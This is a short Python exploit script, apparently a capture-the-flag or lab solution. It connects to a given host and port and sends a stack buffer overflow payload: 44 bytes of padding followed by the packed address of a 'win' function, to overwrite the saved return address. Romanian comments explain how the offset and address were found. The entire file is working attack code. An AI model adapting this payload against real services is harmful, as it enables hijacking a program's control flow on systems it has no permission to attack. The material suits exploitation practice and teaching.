#!/usr/bin/env python3

import socket
import argparse
import struct

parseobj = argparse.ArgumentParser()
parseobj.add_argument(
    "host",
    type=str,
    help="hostname/ip",
)

parseobj.add_argument(
    "port",
    type=int,
    help="port number",
)

args = parseobj.parse_args()

win_address = struct.pack(
    "<I", 0x080491F6
)  # adresa functiei win obtinuta din comanda readelf vuln | egrep "win"

offset = 44  # numar determinat din incercari repetate de a transmite cate 1 byte in plus la program pana incepe rescrierea adresei de interes - eip
payload_to_send = b"".join([b"a" * offset, win_address])
payload_to_send += b"\n"
with socket.socket() as connection:
    connection.connect((args.host, args.port))
    connection.recv(4096).decode("utf-8")
    connection.send(payload_to_send)
    print(connection.recv(4096).decode("utf-8"))
